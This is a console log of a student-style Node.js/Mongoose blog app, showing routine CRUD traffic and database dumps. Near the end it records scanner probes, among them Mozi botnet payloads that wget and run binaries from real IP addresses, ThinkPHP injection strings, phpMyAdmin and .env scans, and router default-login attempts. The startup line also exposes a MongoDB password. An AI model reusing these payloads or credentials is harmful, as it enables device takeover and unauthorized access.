
> blogger@0.0.0 start /home/bitnami/blogger3
> node ./bin/www

Mongoose connected to mongodb://blogger:406blogger@localhost/test
[
  {
    date: '10/12/2020, 5:27:08 PM',
    _id: 5f84c83f744b302c4afc5510,
    blogTitle: 'First Blog',
    blogText: 'This is my first blog',
    __v: 0
  },
  {
    date: '10/12/2020, 5:19:06 PM',
    _id: 5f84c84a744b302c4afc5511,
    blogTitle: 'Second Blog',
    blogText: 'This is my second blog',
    __v: 0
  }
]
[0mGET /api/blogs [32m200 [0m30.310 ms - 257[0m
[0mGET /blogList [32m200 [0m53.353 ms - 2758[0m
[0mGET /stylesheets/style.css [32m200 [0m2.321 ms - 111[0m
[0mGET /js/jquery.min.js [36m304 [0m2.263 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.580 ms - -[0m
[0mGET /css/fontawesome-all.css [32m200 [0m3.154 ms - 54812[0m
[0mGET /css/bootstrap.min.css [32m200 [0m3.439 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m1.628 ms - 1482[0m
[0mPOST /goform/webLogin [33m404 [0m19.088 ms - 1477[0m
[
  {
    date: '10/12/2020, 5:27:08 PM',
    _id: 5f84c83f744b302c4afc5510,
    blogTitle: 'First Blog',
    blogText: 'This is my first blog',
    __v: 0
  },
  {
    date: '10/12/2020, 5:19:06 PM',
    _id: 5f84c84a744b302c4afc5511,
    blogTitle: 'Second Blog',
    blogText: 'This is my second blog',
    __v: 0
  }
]
[0mGET /api/blogs [32m200 [0m52.725 ms - 257[0m
[0mGET /blogList [36m304 [0m61.814 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.592 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.806 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.456 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m2.624 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.255 ms - -[0m
[0mGET / [36m304 [0m1.632 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.574 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.605 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.900 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.726 ms - -[0m
[
  {
    date: '10/12/2020, 5:27:08 PM',
    _id: 5f84c83f744b302c4afc5510,
    blogTitle: 'First Blog',
    blogText: 'This is my first blog',
    __v: 0
  },
  {
    date: '10/12/2020, 5:19:06 PM',
    _id: 5f84c84a744b302c4afc5511,
    blogTitle: 'Second Blog',
    blogText: 'This is my second blog',
    __v: 0
  }
]
[0mGET /api/blogs [32m200 [0m3.425 ms - 257[0m
[0mGET /blogList [36m304 [0m6.846 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.556 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.603 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m3.056 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m3.056 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.529 ms - -[0m
[0mGET /blogAdd [32m200 [0m1.316 ms - 1646[0m
[0mGET /stylesheets/style.css [36m304 [0m0.790 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m3.387 ms - -[0m
[0mGET /js/angular.min.js [36m304 [0m3.943 ms - -[0m
[0mGET /js/angular-route.min.js [36m304 [0m3.936 ms - -[0m
[0mGET /js/angular-ui-router.min.js [36m304 [0m3.913 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.794 ms - -[0m
[
  {
    date: '10/12/2020, 5:27:08 PM',
    _id: 5f84c83f744b302c4afc5510,
    blogTitle: 'First Blog',
    blogText: 'This is my first blog',
    __v: 0
  },
  {
    date: '10/12/2020, 5:19:06 PM',
    _id: 5f84c84a744b302c4afc5511,
    blogTitle: 'Second Blog',
    blogText: 'This is my second blog',
    __v: 0
  }
]
[0mGET /api/blogs [32m200 [0m4.379 ms - 257[0m
[0mGET /blogList [36m304 [0m7.667 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m1.643 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m3.544 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m3.811 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m3.826 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.553 ms - -[0m
[0mGET /blogAdd [36m304 [0m1.282 ms - -[0m
[0mGET /js/angular.min.js [36m304 [0m0.873 ms - -[0m
[0mGET /js/angular-route.min.js [36m304 [0m0.737 ms - -[0m
[0mGET /js/angular-ui-router.min.js [36m304 [0m0.783 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.509 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.969 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m2.066 ms - -[0m
[
  {
    date: '10/12/2020, 5:27:08 PM',
    _id: 5f84c83f744b302c4afc5510,
    blogTitle: 'First Blog',
    blogText: 'This is my first blog',
    __v: 0
  },
  {
    date: '10/12/2020, 5:19:06 PM',
    _id: 5f84c84a744b302c4afc5511,
    blogTitle: 'Second Blog',
    blogText: 'This is my second blog',
    __v: 0
  }
]
[0mGET /api/blogs [32m200 [0m3.337 ms - 257[0m
[0mGET /blogList [36m304 [0m6.681 ms - -[0m
[0mGET /stylesheets/style.css [32m200 [0m0.734 ms - 111[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.528 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m3.681 ms - -[0m
[0mGET /css/fontawesome-all.css [32m200 [0m4.956 ms - 54812[0m
[0mGET /css/bootstrap.min.css [32m200 [0m5.520 ms - 160302[0m
[0mGET /api/blogs/5f84c83f744b302c4afc5510 [32m200 [0m11.440 ms - 134[0m
[0mGET /blogEdit/5f84c83f744b302c4afc5510 [32m200 [0m15.174 ms - 1760[0m
[0mGET /js/angular.min.js [36m304 [0m0.866 ms - -[0m
[0mGET /stylesheets/style.css [32m200 [0m1.923 ms - 111[0m
[0mGET /js/angular-route.min.js [36m304 [0m5.958 ms - -[0m
[0mGET /js/angular-ui-router.min.js [36m304 [0m5.547 ms - -[0m
[0mGET /css/fontawesome-all.css [32m200 [0m2.258 ms - 54812[0m
[0mGET /css/bootstrap.min.css [32m200 [0m5.472 ms - 160302[0m
[0mGET /blogAdd [36m304 [0m1.037 ms - -[0m
[0mGET /js/angular.min.js [36m304 [0m0.759 ms - -[0m
[0mGET /js/angular-route.min.js [36m304 [0m0.748 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.822 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.386 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m2.531 ms - -[0m
[0mGET /js/angular-ui-router.min.js [36m304 [0m9.275 ms - -[0m
[0mPOST /api/blogs/ [32m201 [0m14.604 ms - 134[0m
[0mPOST /blogAdd [36m302 [0m36.217 ms - 62[0m
[
  {
    date: '10/12/2020, 5:27:08 PM',
    _id: 5f84c83f744b302c4afc5510,
    blogTitle: 'First Blog',
    blogText: 'This is my first blog',
    __v: 0
  },
  {
    date: '10/12/2020, 5:19:06 PM',
    _id: 5f84c84a744b302c4afc5511,
    blogTitle: 'Second Blog',
    blogText: 'This is my second blog',
    __v: 0
  },
  {
    date: '10/12/2020, 6:19:24 PM',
    _id: 5f84d66c2472332c9025a167,
    blogTitle: 'Third Blog',
    blogText: 'This is my third blog',
    __v: 0
  }
]
[0mGET /api/blogs [32m200 [0m3.169 ms - 384[0m
[0mGET /blogList [32m200 [0m5.999 ms - 3696[0m
[0mGET /stylesheets/style.css [32m200 [0m0.576 ms - 111[0m
[0mGET /js/jquery.min.js [36m304 [0m1.726 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.586 ms - -[0m
[0mGET /css/fontawesome-all.css [32m200 [0m2.831 ms - 54812[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.832 ms - 160302[0m
[0mGET / [36m304 [0m1.208 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.485 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.132 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m1.186 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.504 ms - -[0m
[0mGET / [36m304 [0m1.976 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.842 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.309 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.477 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.539 ms - -[0m
[
  {
    date: '10/12/2020, 5:27:08 PM',
    _id: 5f84c83f744b302c4afc5510,
    blogTitle: 'First Blog',
    blogText: 'This is my first blog',
    __v: 0
  },
  {
    date: '10/12/2020, 5:19:06 PM',
    _id: 5f84c84a744b302c4afc5511,
    blogTitle: 'Second Blog',
    blogText: 'This is my second blog',
    __v: 0
  },
  {
    date: '10/12/2020, 6:19:24 PM',
    _id: 5f84d66c2472332c9025a167,
    blogTitle: 'Third Blog',
    blogText: 'This is my third blog',
    __v: 0
  }
]
[0mGET /api/blogs [32m200 [0m6.437 ms - 384[0m
[0mGET /blogList [36m304 [0m9.330 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.381 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.308 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m3.295 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m2.901 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.557 ms - -[0m
[0mGET /blogAdd [32m200 [0m0.980 ms - 1646[0m
[0mGET /js/angular.min.js [36m304 [0m0.864 ms - -[0m
[0mGET /js/angular-route.min.js [36m304 [0m0.720 ms - -[0m
[0mGET /js/angular-ui-router.min.js [36m304 [0m0.838 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.332 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.654 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.613 ms - -[0m
[0mGET / [36m304 [0m0.999 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m2.763 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.795 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.807 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.957 ms - -[0m
[0mGET / [32m200 [0m0.935 ms - 819[0m
[0mGET /stylesheets/style.css [32m200 [0m0.653 ms - 111[0m
[0mGET /js/bootstrap.min.js [32m200 [0m1.442 ms - 60044[0m
[0mGET /js/jquery.min.js [32m200 [0m2.196 ms - 89476[0m
[0mGET /css/bootstrap.min.css [32m200 [0m0.748 ms - 160302[0m
[
  {
    date: '10/12/2020, 5:27:08 PM',
    _id: 5f84c83f744b302c4afc5510,
    blogTitle: 'First Blog',
    blogText: 'This is my first blog',
    __v: 0
  },
  {
    date: '10/12/2020, 5:19:06 PM',
    _id: 5f84c84a744b302c4afc5511,
    blogTitle: 'Second Blog',
    blogText: 'This is my second blog',
    __v: 0
  },
  {
    date: '10/12/2020, 6:19:24 PM',
    _id: 5f84d66c2472332c9025a167,
    blogTitle: 'Third Blog',
    blogText: 'This is my third blog',
    __v: 0
  }
]
[0mGET /api/blogs [32m200 [0m6.031 ms - 384[0m
[0mGET /blogList [32m200 [0m9.095 ms - 3696[0m
[0mGET /css/fontawesome-all.css [32m200 [0m1.894 ms - 54812[0m
[0mGET /stylesheets/style.css [36m304 [0m0.605 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.620 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.374 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.549 ms - -[0m
[0mGET /webfonts/fa-solid-900.woff2 [32m200 [0m0.867 ms - 50372[0m
[0mGET /api/blogs/5f84c83f744b302c4afc5510 [32m200 [0m2.581 ms - 134[0m
[0mGET /blogEdit/5f84c83f744b302c4afc5510 [32m200 [0m5.708 ms - 1760[0m
[0mGET /js/angular-route.min.js [32m200 [0m2.066 ms - 4608[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.749 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.477 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.736 ms - -[0m
[0mGET /js/angular.min.js [32m200 [0m3.863 ms - 177245[0m
[0mGET /js/angular-ui-router.min.js [32m200 [0m3.536 ms - 114868[0m
[0mPUT /api/blogs/5f84c83f744b302c4afc5510 [32m200 [0m6.043 ms - 104[0m
[0mPOST /blogEdit/5f84c83f744b302c4afc5510 [36m302 [0m8.775 ms - 62[0m
[
  {
    date: '10/12/2020, 5:27:08 PM',
    _id: 5f84c83f744b302c4afc5510,
    blogTitle: 'First Blog!',
    blogText: 'This is my first blog!',
    __v: 0
  },
  {
    date: '10/12/2020, 5:19:06 PM',
    _id: 5f84c84a744b302c4afc5511,
    blogTitle: 'Second Blog',
    blogText: 'This is my second blog',
    __v: 0
  },
  {
    date: '10/12/2020, 6:19:24 PM',
    _id: 5f84d66c2472332c9025a167,
    blogTitle: 'Third Blog',
    blogText: 'This is my third blog',
    __v: 0
  }
]
[0mGET /api/blogs [32m200 [0m3.852 ms - 386[0m
[0mGET /blogList [32m200 [0m6.382 ms - 3697[0m
[0mGET /stylesheets/style.css [36m304 [0m0.390 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.566 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m0.684 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.656 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.546 ms - -[0m
[0mGET /webfonts/fa-solid-900.woff2 [36m304 [0m0.566 ms - -[0m
[0mGET /api/blogs/5f84c83f744b302c4afc5510 [32m200 [0m2.551 ms - 136[0m
[0mGET /blogEdit/5f84c83f744b302c4afc5510 [32m200 [0m6.324 ms - 1762[0m
[0mGET /js/angular.min.js [36m304 [0m0.890 ms - -[0m
[0mGET /js/angular-route.min.js [36m304 [0m0.722 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.707 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m1.553 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.011 ms - -[0m
[0mGET /js/angular-ui-router.min.js [36m304 [0m0.768 ms - -[0m
[0mPUT /api/blogs/5f84c83f744b302c4afc5510 [32m200 [0m9.503 ms - 104[0m
[0mPOST /blogEdit/5f84c83f744b302c4afc5510 [36m302 [0m12.058 ms - 62[0m
[
  {
    date: '10/12/2020, 5:27:08 PM',
    _id: 5f84c83f744b302c4afc5510,
    blogTitle: 'First Blog!',
    blogText: 'This is my first blog!',
    __v: 0
  },
  {
    date: '10/12/2020, 5:19:06 PM',
    _id: 5f84c84a744b302c4afc5511,
    blogTitle: 'Second Blog',
    blogText: 'This is my second blog',
    __v: 0
  },
  {
    date: '10/12/2020, 6:19:24 PM',
    _id: 5f84d66c2472332c9025a167,
    blogTitle: 'Third Blog',
    blogText: 'This is my third blog',
    __v: 0
  }
]
[0mGET /api/blogs [32m200 [0m4.029 ms - 386[0m
[0mGET /blogList [36m304 [0m6.769 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m2.228 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m3.128 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m3.103 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m3.298 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m3.282 ms - -[0m
[0mGET /blogAdd [32m200 [0m1.033 ms - 1646[0m
[0mGET /js/angular.min.js [36m304 [0m0.888 ms - -[0m
[0mGET /js/angular-route.min.js [36m304 [0m0.701 ms - -[0m
[0mGET /js/angular-ui-router.min.js [36m304 [0m1.836 ms - -[0m
[0mGET /stylesheets/style.css [32m200 [0m0.906 ms - 111[0m
[0mGET /css/fontawesome-all.css [32m200 [0m0.788 ms - 54812[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.862 ms - 160302[0m
[0mPOST /api/blogs/ [32m201 [0m2.862 ms - 126[0m
[0mPOST /blogAdd [36m302 [0m5.950 ms - 62[0m
[
  {
    date: '10/12/2020, 5:27:08 PM',
    _id: 5f84c83f744b302c4afc5510,
    blogTitle: 'First Blog!',
    blogText: 'This is my first blog!',
    __v: 0
  },
  {
    date: '10/12/2020, 5:19:06 PM',
    _id: 5f84c84a744b302c4afc5511,
    blogTitle: 'Second Blog',
    blogText: 'This is my second blog',
    __v: 0
  },
  {
    date: '10/12/2020, 6:19:24 PM',
    _id: 5f84d66c2472332c9025a167,
    blogTitle: 'Third Blog',
    blogText: 'This is my third blog',
    __v: 0
  },
  {
    date: '10/12/2020, 6:37:15 PM',
    _id: 5f84da9b2472332c9025a168,
    blogTitle: 'Added by Prof Rogers',
    blogText: 'Hey',
    __v: 0
  }
]
[0mGET /api/blogs [32m200 [0m3.168 ms - 505[0m
[0mGET /blogList [32m200 [0m7.003 ms - 4617[0m
[0mGET /stylesheets/style.css [36m304 [0m1.168 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m1.485 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m1.553 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m0.638 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m0.528 ms - -[0m
[0mGET /webfonts/fa-solid-900.woff2 [36m304 [0m0.521 ms - -[0m
[0mGET /api/blogs/5f84da9b2472332c9025a168 [32m200 [0m2.513 ms - 126[0m
[0mGET /blogDelete/5f84da9b2472332c9025a168 [32m200 [0m5.798 ms - 1911[0m
[0mGET /stylesheets/style.css [36m304 [0m0.443 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m6.249 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m5.063 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m7.492 ms - -[0m
[0mGET /css/fontawesome-all.css [36m304 [0m5.528 ms - -[0m
(node:11408) DeprecationWarning: Mongoose: `findOneAndUpdate()` and `findOneAndDelete()` without the `useFindAndModify` option set to false are deprecated. See: https://mongoosejs.com/docs/deprecations.html#findandmodify
[0mDELETE /api/blogs/5f84da9b2472332c9025a168 [32m204 [0m9.416 ms - -[0m
[0mPOST /blogDelete/5f84da9b2472332c9025a168 [36m302 [0m12.166 ms - 62[0m
[
  {
    date: '10/12/2020, 5:27:08 PM',
    _id: 5f84c83f744b302c4afc5510,
    blogTitle: 'First Blog!',
    blogText: 'This is my first blog!',
    __v: 0
  },
  {
    date: '10/12/2020, 5:19:06 PM',
    _id: 5f84c84a744b302c4afc5511,
    blogTitle: 'Second Blog',
    blogText: 'This is my second blog',
    __v: 0
  },
  {
    date: '10/12/2020, 6:19:24 PM',
    _id: 5f84d66c2472332c9025a167,
    blogTitle: 'Third Blog',
    blogText: 'This is my third blog',
    __v: 0
  }
]
[0mGET /api/blogs [32m200 [0m2.810 ms - 386[0m
[0mGET /blogList [32m200 [0m5.327 ms - 3697[0m
[0mGET /css/fontawesome-all.css [36m304 [0m1.843 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.809 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m2.259 ms - -[0m
[0mGET /js/bootstrap.min.js [36m304 [0m1.654 ms - -[0m
[0mGET /js/jquery.min.js [36m304 [0m2.639 ms - -[0m
[
  {
    date: '10/12/2020, 5:27:08 PM',
    _id: 5f84c83f744b302c4afc5510,
    blogTitle: 'First Blog!',
    blogText: 'This is my first blog!',
    __v: 0
  },
  {
    date: '10/12/2020, 5:19:06 PM',
    _id: 5f84c84a744b302c4afc5511,
    blogTitle: 'Second Blog',
    blogText: 'This is my second blog',
    __v: 0
  },
  {
    date: '10/12/2020, 6:19:24 PM',
    _id: 5f84d66c2472332c9025a167,
    blogTitle: 'Third Blog',
    blogText: 'This is my third blog',
    __v: 0
  }
]
[0mGET /api/blogs [32m200 [0m2.915 ms - 386[0m
[0mGET / [32m200 [0m1.038 ms - 819[0m
[0mGET /portal/redlion [33m404 [0m1.145 ms - 1482[0m
[0mGET / [32m200 [0m0.993 ms - 819[0m
[0mPOST /HNAP1/ [33m404 [0m1.054 ms - 1477[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://119.183.37.139:41889/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m1.117 ms - 1482[0m
[0mGET /.env [33m404 [0m1.054 ms - 1482[0m
[0mPOST / [33m404 [0m1.042 ms - 1477[0m
[0mGET / [32m200 [0m0.975 ms - 819[0m
[0mGET / [32m200 [0m0.787 ms - 819[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m1.122 ms - 1482[0m
[0mGET /phpmanager/scripts/setup.php [33m404 [0m4.861 ms - 1482[0m
[0mGET /php-my-admin/scripts/setup.php [33m404 [0m1.039 ms - 1482[0m
[0mGET /phpmyadmin1/scripts/setup.php [33m404 [0m1.153 ms - 1482[0m
[0mGET /phpMyAdmin2/scripts/setup.php [33m404 [0m1.693 ms - 1482[0m
[0mGET /phpMyAdmin3/scripts/setup.php [33m404 [0m1.048 ms - 1482[0m
[0mGET /phpMyAdmi/scripts/setup.php [33m404 [0m1.070 ms - 1482[0m
[0mGET /phpmy/scripts/setup.php [33m404 [0m0.930 ms - 1482[0m
[0mGET /phpMyAdmin-2/scripts/setup.php [33m404 [0m1.142 ms - 1482[0m
[0mGET /phpMyAdmin-3/scripts/setup.php [33m404 [0m1.053 ms - 1482[0m
[0mGET /admin/pma/scripts/setup.php [33m404 [0m1.103 ms - 1482[0m
[0mGET /mysql/db/scripts/setup.php [33m404 [0m0.984 ms - 1482[0m
[0mGET /PMA/scripts/setup.php [33m404 [0m0.921 ms - 1482[0m
[0mGET /pma/scripts/setup.php [33m404 [0m1.944 ms - 1482[0m
[0mGET /myadmin/scripts/setup.php [33m404 [0m1.101 ms - 1482[0m
[0mGET /sql/scripts/setup.php [33m404 [0m0.973 ms - 1482[0m
[0mGET /phpMyAdminold/scripts/setup.php [33m404 [0m1.028 ms - 1482[0m
[0mGET /phpmy-admin/scripts/setup.php [33m404 [0m1.037 ms - 1482[0m
[0mGET /db-admin/scripts/setup.php [33m404 [0m1.113 ms - 1482[0m
[0mGET /phpmy-admin/scripts/setup.php [33m404 [0m1.064 ms - 1482[0m
[0mGET /admin/scripts/setup.php [33m404 [0m1.037 ms - 1482[0m
[0mGET /sql/scripts/setup.php [33m404 [0m1.007 ms - 1482[0m
[0mGET /scripts/setup.php [33m404 [0m1.932 ms - 1482[0m
[0mGET /.env [33m404 [0m1.021 ms - 1482[0m
[0mPOST / [33m404 [0m1.022 ms - 1477[0m
[0mGET /.env [33m404 [0m2.288 ms - 1482[0m
[0mPOST / [33m404 [0m1.064 ms - 1477[0m
[0mGET / [32m200 [0m0.990 ms - 819[0m
[0mGET / [32m200 [0m2.745 ms - 819[0m
[0mGET / [32m200 [0m0.915 ms - 819[0m
[0mGET /boaform/admin/formLogin?username=user&psd=user [33m404 [0m1.110 ms - 1482[0m
[0mHEAD /robots.txt [33m404 [0m1.062 ms - 1482[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m1.060 ms - 1482[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m1.035 ms - 819[0m
[0mGET /ReportServer [33m404 [0m1.072 ms - 1482[0m
[0mGET / [32m200 [0m0.942 ms - 819[0m
[0mGET / [32m200 [0m1.007 ms - 819[0m
[0mGET /robots.txt [33m404 [0m1.115 ms - 1482[0m
[0mGET /sitemap.xml [33m404 [0m1.076 ms - 1482[0m
[0mGET /.well-known/security.txt [33m404 [0m1.082 ms - 1482[0m
[0mGET /favicon.ico [33m404 [0m1.130 ms - 1482[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.938 ms - 819[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m1.100 ms - 1482[0m
[0mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp [33m404 [0m1.094 ms - 1482[0m
[0mGET / [32m200 [0m0.943 ms - 819[0m
[0mGET /wp-content/plugins/wp-file-manager/readme.txt [33m404 [0m1.184 ms - 1482[0m
[0mPOST /api/jsonws/invoke [33m404 [0m1.030 ms - 1470[0m
[0mGET / [32m200 [0m0.960 ms - 819[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.170 ms - 1482[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://112.27.124.143:53365/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.569 ms - 1482[0m
[0mGET / [32m200 [0m1.650 ms - 819[0m
[0mGET / [32m200 [0m0.993 ms - 819[0m
[0mGET / [32m200 [0m0.985 ms - 819[0m
[0mGET / [32m200 [0m1.034 ms - 819[0m
[0mGET / [32m200 [0m0.965 ms - 819[0m
[0mGET / [32m200 [0m1.019 ms - 819[0m
